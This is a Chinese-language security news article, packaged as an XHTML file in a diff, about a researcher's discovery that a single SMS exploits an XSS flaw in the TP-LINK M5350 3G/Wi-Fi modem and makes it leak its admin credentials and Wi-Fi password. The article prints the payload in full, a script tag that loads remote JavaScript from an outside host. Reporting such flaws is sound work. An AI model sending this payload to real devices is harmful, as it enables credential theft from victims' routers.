@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>如何用一条信息获取TP-LINK M5350 3G/Wi-Fi解调器的管理员凭证</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>如何用一条信息获取TP-LINK M5350 3G/Wi-Fi解调器的管理员凭证</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&amp;mid=2247485550&amp;idx=1&amp;sn=fbbca4e536c20c2eb26ddf6bd57ba42b&amp;chksm=ea973904dde0b01249271f9d3fc1ae993c382f4d16bd0ca8c806924a6916cf9e913b45a17760&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&amp;mid=2247485550&amp;idx=1&amp;sn=fbbca4e536c20c2eb26ddf6bd57ba42b&amp;chksm=ea973904dde0b01249271f9d3fc1ae993c382f4d16bd0ca8c806924a6916cf9e913b45a17760&amp;scene=27#wechat_redirect</a></blockquote><p style="text-align: center;"><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz_png/UsQySyjOKianlqlYGBGRPd2lUG28OE5L8vukVOeoWyF6ibqzGIF8B0XuCL7DB9mma7YMkylk562UyUZ8yLkq4ticw/0?wx_fmt=png" data-ratio="0.5625899280575539" data-w="695" src="../Images/93243760ce386fa414ac2785cb8d8440.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/UsQySyjOKianlqlYGBGRPd2lUG28OE5L8vukVOeoWyF6ibqzGIF8B0XuCL7DB9mma7YMkylk562UyUZ8yLkq4ticw/0?wx_fmt=png"/></p><p><strong>一名德国研究人员发现了如何通过发送一条信息的方式从一台TP-LINK M5350 3G/Wi-Fi调制解调器中提取管理员凭证。</strong></p><p><br/></p><p>Jan Hörsch发现了这台设备中的一个bug，从本质上来讲它是一个XSS漏洞，攻击者只发送一条包含以下攻击脚本的短信就能实施攻击。</p><p><br/></p><p>&lt;script src=//n.ms/a.js&gt;&lt;/script&gt;</p><p><br/></p><p>这名研究员在多种物联网设备中进行了大量研究，并发现了多种漏洞。他分析了运行在多个智能设备上的固件并发现了很多容易被利用的bug。这次发现的bug看似是开发人员创建的一个功能，很可能是用于测试目的，但很遗憾在生产过程中并未被删除。攻击者发送信息后，路由器会返回管理员用户名和密码、SSID以及登录密码。</p><p><br/></p><p>TP-LINK目前可能还未修复这个漏洞。从TP-LINK M5350的固件下载页面来看，最近发现有缺陷的设备是发布于2015年1月份的M5350_V2_140115。</p><p>这名研究员还分析了一台日本松下公司的BM ET200视网膜扫描仪以及一台Startech调制解调器，它们都受漏洞影响。</p><p><br/></p><p><br/></p><p><strong style="white-space: normal;">本文由测腾代码卫士编译，不代表测腾观点，转载请注明“转自测腾代码卫士www.codesafe.cn”。</strong></p>
+        
+</body>
+</html>
